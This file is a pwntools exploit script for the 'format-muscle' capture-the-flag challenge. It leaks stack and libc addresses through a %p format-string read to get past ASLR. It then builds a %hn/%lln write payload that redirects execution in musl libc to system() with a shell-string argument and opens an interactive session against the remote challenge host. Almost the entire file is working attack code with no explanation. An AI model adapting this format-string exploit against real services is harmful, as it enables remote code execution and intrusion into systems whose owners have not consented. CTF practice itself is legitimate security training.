from pwn import *
from icecream import ic
import tty

# Set up pwntools for the correct architecture
exe = "./format-muscle_patched"
libc = ELF("./ld-musl-x86_64.so.1")
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("format-muscle.chal.crewc.tf", 1337)
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* main+92
    c
'''.format(**locals())

# Useful macros
def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()
eof = chr(tty.CEOF)

def pretty(addr, vall):
    aa = vall%0x10000
    bb = (vall//0x10000)%0x10000
    cc = (vall//0x100000000)%0x10000

    val = {}
    val[aa] = addr    
    val[bb] = addr+2    
    val[cc] = addr+4   
    ic(val)

    keys = list(val.keys())
    keys.sort()

    a = keys[0]
    addr1 = val[a]
    b = keys[1]
    addr2 = val[b]
    c = keys[2]
    addr3 = val[c]

    tmp = f"%{a-19}c".encode()  
    tmp += b"%1c"*19
    tmp += f"%hn%{b-a}c%hn%{c-b}c%hn%{0x687309-c}c%lln".encode() 
    tmp += b"A"*(120 - len(tmp))
    tmp += p64(addr1)
    tmp += b"B"*8
    tmp += p64(addr2)
    tmp += b"B"*8
    tmp += p64(addr3)
    tmp += b"B"*8
    tmp += p64(arg)

    ic(hex(a), hex(b), hex(c))
    ic(hex(vall))

    return tmp


r = start()
ru(b"== proof-of-work: disabled ==\n")
sl(b"%p-"*(250//3))
libc.address = int(rl().split(b"-")[40], 16) - 0x1afde

ic(hex(libc.address))
off = libc.address + 0xad1c0
arg = libc.address + 0xad180

sl(pretty(off, libc.sym.system))

r.interactive()